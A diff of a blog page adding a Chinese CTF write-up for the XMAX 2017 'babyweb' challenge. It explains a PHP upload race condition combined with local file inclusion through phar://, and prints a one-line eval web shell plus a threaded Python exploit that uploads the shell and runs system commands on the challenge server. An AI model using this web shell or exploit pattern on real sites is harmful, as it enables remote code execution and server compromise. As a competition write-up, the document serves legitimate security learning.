class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagejpeg($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> <span class="keyword">if</span> ($type==<span class="string">'image/gif'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromgif($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagegif($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				unlink($rootpath);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"图片ID："</span>.$time;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"ERROR"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require</span>(<span class="string">"header.php"</span>);</div><div class="line">	$page=<span class="string">""</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</div><div class="line">	&#123;</div><div class="line">		$page=strtolower($_GET[<span class="string">'page'</span>]);</div><div class="line">		$page=str_replace(<span class="string">"#"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=$page.<span class="string">".php"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		$page=<span class="string">"main.php"</span>;</div><div class="line">	<span class="keyword">include</span>($page);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。</p>
+<p>基本的流程如下。<br>首先有个k.php，内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
+<p>将它压缩为zip文件，文件名为k.zip。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true" alt=""></p>
+<p>然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问<code>http://202.112.51.217:8199/uploads/</code>，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/upload.php'</span></div><div class="line">    data = &#123;<span class="string">'title'</span>:<span class="string">'1'</span>,<span class="string">'url'</span>:<span class="string">'1'</span>&#125;</div><div class="line">    files = &#123;<span class="string">'pic'</span>: (<span class="string">'k.jpg'</span>, open(<span class="string">'k.zip'</span>, <span class="string">'rb'</span>), <span class="string">'image/jpeg'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line">    html = s.post(url,files=files)</div><div class="line"></div><div class="line">// get the latest filename</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/uploads/'</span></div><div class="line">    content = s.get(url).content</div><div class="line">    reg = <span class="string">r'href="(.+?\.jpg)"'</span></div><div class="line">    imgre = re.compile(reg)</div><div class="line">    imglist = re.findall(imgre,content)</div><div class="line">    <span class="keyword">return</span> imglist[::<span class="number">-1</span>]      </div><div class="line"></div><div class="line">// use phar getshell</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></div><div class="line">	filename = getfilename()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> filename:</div><div class="line">	    url = <span class="string">'http://202.112.51.217:8199/index.php?page=phar://uploads/'</span> + i +<span class="string">'/k'</span></div><div class="line">	    data = &#123;<span class="string">'test'</span>:<span class="string">'system("ls");'</span>&#125;</div><div class="line">	    content = s.post(url,data=data).content</div><div class="line">	    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</div><div class="line">	        <span class="keyword">print</span> content</div><div class="line">	        exit()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    t1 = threading.Thread(target=uploadfile)</div><div class="line">    t2 = threading.Thread(target=getshell)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true" alt=""></p>
+<p>之后将getshell里的改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;</div><div class="line">content = s.post(url,data=data).content</div><div class="line">if &apos;&#123;&apos; in content:</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true" alt=""></p>
+<p>因为index.php中对<code>#</code>进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k</div></pre></td></tr></table></figure></p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
+<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></li>
+<li><a href="http://4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
+<li><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE） </a></li>
 </ul>
 
       
@@ -528,6 +439,36 @@
 	<div>
       
         
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/">XMAX夏令营-2017-babyweb-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年08月22日 - 13:08</p>
+  <p><span>最后更新:</span>2017年08月22日 - 16:08</p>
+  <p><span>原始链接:</span><a href="/2017/08/22/XMAX夏令营-2017-babyweb-writeup/" title="XMAX夏令营-2017-babyweb-writeup">http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/22/XMAX夏令营-2017-babyweb-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
 
       
 	</div>
@@ -566,9 +507,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/web/" rel="tag"># web</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
           
         </div>
       
@@ -577,8 +520,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="next" title="ACM-OJ[长期更新]">
-                <i class="fa fa-chevron-left"></i> ACM-OJ[长期更新]
+              <a href="/2017/08/19/Software-Security-Learning/" rel="next" title="Software-Security-Learning">
+                <i class="fa fa-chevron-left"></i> Software-Security-Learning
               </a>
             
           </div>
@@ -586,6 +529,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -763,7 +710,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Project"><span class="nav-number">1.</span> <span class="nav-text">Project</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Security"><span class="nav-number">2.</span> <span class="nav-text">Web Security</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">2.1.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vuln-Analysis"><span class="nav-number">2.2.</span> <span class="nav-text">Vuln Analysis</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bin-Security"><span class="nav-number">3.</span> <span class="nav-text">Bin Security</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#机器学习"><span class="nav-number">4.</span> <span class="nav-text">机器学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据挖掘"><span class="nav-number">5.</span> <span class="nav-text">数据挖掘</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#技术杂谈"><span class="nav-number">6.</span> <span class="nav-text">技术杂谈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编程练习"><span class="nav-number">7.</span> <span class="nav-text">编程练习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#随笔"><span class="nav-number">8.</span> <span class="nav-text">随笔</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Writeup"><span class="nav-number">9.</span> <span class="nav-text">Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">9.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF"><span class="nav-number">9.1.1.</span> <span class="nav-text">CTF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli-lab"><span class="nav-number">9.1.2.</span> <span class="nav-text">sqli-lab</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">9.2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-1"><span class="nav-number">9.2.1.</span> <span class="nav-text">CTF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnable-kr"><span class="nav-number">9.2.2.</span> <span class="nav-text">pwnable.kr</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">9.3.</span> <span class="nav-text">Misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">9.4.</span> <span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">9.5.</span> <span class="nav-text">Re</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refference"><span class="nav-number">3.</span> <span class="nav-text">Refference</span></a></li></ol></div>
             
 
           </div>
